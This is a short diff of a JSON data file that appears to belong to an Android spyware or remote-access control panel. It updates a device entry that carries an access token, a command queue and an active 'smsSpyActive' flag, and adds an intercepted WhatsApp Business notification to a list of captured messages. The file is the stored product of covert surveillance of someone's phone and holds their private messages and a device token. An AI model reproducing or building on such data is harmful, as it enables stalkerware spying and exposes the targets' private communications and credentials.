@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775630772518,
+    "lastSeen": 1775630796122,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "JB || KHAFA X NAZRIEL: ~ [𝐂𝐄𝐎 𝐂𝐇𝐈𝐓𝐄𝐑]🔰",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "08/04 13:46",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775630798706
+      },
       {
         "appName": "Messages",
         "sender": "XL",
